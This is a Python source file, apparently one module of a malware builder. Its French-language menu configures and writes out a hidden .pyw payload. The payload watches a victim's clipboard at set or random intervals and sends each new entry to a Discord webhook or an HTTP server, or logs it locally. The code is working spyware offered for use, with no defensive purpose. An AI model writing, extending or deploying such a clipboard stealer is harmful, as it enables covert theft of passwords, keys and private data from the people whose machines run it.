import os
from colorama import Fore, Style
import time
import random

def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Clipboard ===\n\n")
    print("""
          
          Options : 

    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
    2. Type de données à capturer (texte, images, etc.)
    3. Sauvegarde locale
        
         
          Sortie et envoi:

    4. Envoi sur discord
    5. Envoi sur serveur HTTP
                      
 Tapez: set <num> pour configurer une option, ou exit pour quitter. 
 Tapez: show pour afficher la configuration actuelle.
 Tapez: create pour créer le payload avec la configuration actuelle.
                 
          """)

def clipboard_module():
    clear()
    print("=== Clipboard Configuration ===\n\n")
    choix = {
        "Intervalle de capture": None,
        "Type de données à capturer": None,
        "Taille maximale du clipboard (Mo)": None,
        "Limite de débit (envois/minute)": None,
        "Seuil de longueur du texte": None,
        "Heure de début de capture": None,
        "Heure de fin de capture": None,
        "Début Pause de capture": None,
        "Fin Pause de capture": None,
        "Sauvegarde locale": None,
        "Envoi sur Discord": None,
        "Envoi par email": None,
        "Envoi sur serveur HTTP": None,
    }            

    def intervalle_capture():
        clear()
        print("Définir l'intervalle de capture en secondes.\n\n")

        intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
        try:
            if intervalle.lower() == 'random':
                intervalle = random.randint(1, 10)
                print(f"Intervalle défini sur {intervalle} secondes.")
                time.sleep(2)
                choix["Intervalle de capture"] = intervalle
            else:
                if int(intervalle) <= 0:
                    print(Fore.RED + "Veuillez entrer un nombre positif." + Style.RESET_ALL)
                    time.sleep(2)
                    return
                else:
                    choix["Intervalle de capture"] = int(intervalle)
                    print(f"Intervalle défini sur {intervalle} secondes.")
                    time.sleep(2)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
            time.sleep(2)


    def type_donnees():  
        clear()
        data_type = input("Définir le type de données à capturer (texte, images) : ")
        choix["Type de données à capturer"] = data_type
        print(f"Type de données à capturer défini sur {data_type}.")
        time.sleep(2)  

    def sauvegarde_locale():
        clear()
        save_local = input("Entrez le chemin de sauvegarde locale (C:/path/to/save) (pas le nom du fichier): ")
        choix["Sauvegarde locale"] = save_local
        time.sleep(2)

    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook discord : ")
        choix["Envoi sur Discord"] = webhook
        time.sleep(2)

    def envoi_http():
        clear()
        reponse = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = reponse
        time.sleep(2)

    options = [
        ("Intervalle de capture (en secondes)", intervalle_capture),
        ("Type de données à capturer (texte, images, etc.)" , type_donnees),
        ("Sauvegarde locale " , sauvegarde_locale),
        ("Envoi sur discord" , envoi_discord),
        ("Envoi sur serveur HTTP" , envoi_http),
    ]
    
    def create_payload():
        with open("Option/modules/payload/payload_created/clipboard_payload.pyw", "w") as f:

            # IMPORT
            f.write("import clipboard\n")
            f.write("import time\n")
            f.write("import requests\n\n")

            # Début fonction clipboard
            f.write("def clipboard_monitor():\n")

            # Choisir la méthode selon le type
            getter = "clipboard.paste()" if choix["Type de données à capturer"] in [None, "texte"] else "clipboard.get_image()"

            # Intervalle
            intervalle = choix["Intervalle de capture"] or 2

            f.write(f"    old = {getter}\n")
            f.write("    message = 'Presse papier : '\n")
            f.write("    while True:\n")
            f.write(f"        time.sleep({intervalle})\n")
            f.write("        current_time = time.strftime('%H:%M')\n")

            # Heure de début et fin
            if choix["Heure de début de capture"] and choix["Heure de fin de capture"]:
                f.write(f"        if current_time < '{choix['Heure de début de capture']}' or current_time > '{choix['Heure de fin de capture']}':\n")
                f.write("            time.sleep(60)\n")
                f.write("            continue\n")

            # Début et fin pause
            if choix["Début Pause de capture"] and choix["Fin Pause de capture"]:
                f.write(f"        if '{choix['Début Pause de capture']}' <= current_time <= '{choix['Fin Pause de capture']}':\n")
                f.write("            time.sleep(60)\n")
                f.write("            continue\n")

            # Lecture clipboard
            f.write(f"        mtn = {getter}\n")
            f.write("        if old != mtn:\n")
            f.write("            old = mtn\n")

            # Sauvegarde locale
            if choix["Sauvegarde locale"]:
                f.write(f"            with open(r'{choix['Sauvegarde locale']}\\clipboard_log.txt', 'a') as file:\n")
                f.write("                file.write(message + str(mtn) + '\\n')\n")

            # Envoi Discord
            if choix["Envoi sur Discord"]:
                f.write(f"            requests.post('{choix['Envoi sur Discord']}', data={{'content': message + str(mtn)}})\n")

            # Envoi HTTP
            if choix["Envoi sur serveur HTTP"]:
                f.write(f"            requests.post('{choix['Envoi sur serveur HTTP']}', data={{'clipboard': message + str(mtn)}})\n")

            f.write("\nclipboard_monitor()\n")

    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            print("\nConfiguration actuelle du module Clipboard :")
            for option, value in choix.items():
                print(f"{option} : {value}")
            input("\nAppuyez sur Entrée pour continuer...")

        if cmd.lower() == "create":
            create_payload()
            break
